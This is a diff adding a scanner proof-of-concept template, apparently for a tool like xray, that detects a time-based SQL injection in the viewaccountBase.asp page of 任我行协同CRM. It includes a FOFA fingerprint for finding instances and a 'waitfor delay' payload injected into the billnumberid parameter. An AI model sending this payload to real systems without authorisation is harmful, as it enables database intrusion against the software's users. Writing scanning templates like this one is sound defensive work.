@@ -1,0 +1,17 @@
+id: poc-yaml-wecrm-viewaccountbase-sqli
+info:
+  name: 任我行协同CRM普及版 viewaccountBase SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 任我行协同CRM
+  fofa: app="任我行软件-管家婆分销ERP"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /common/viewaccountBase.asp?TimeCheckPoint=80685.73&billnumberid=-1%20waitfor%20delay%20%270:0:{{.t1}}%27--&billtype=
+  expression: status_code == 500 && contains(body,"SQL Server") && contains(body,"/common/viewaccountBase.asp")
+    && duration > t1 && duration < t2
+transport: http
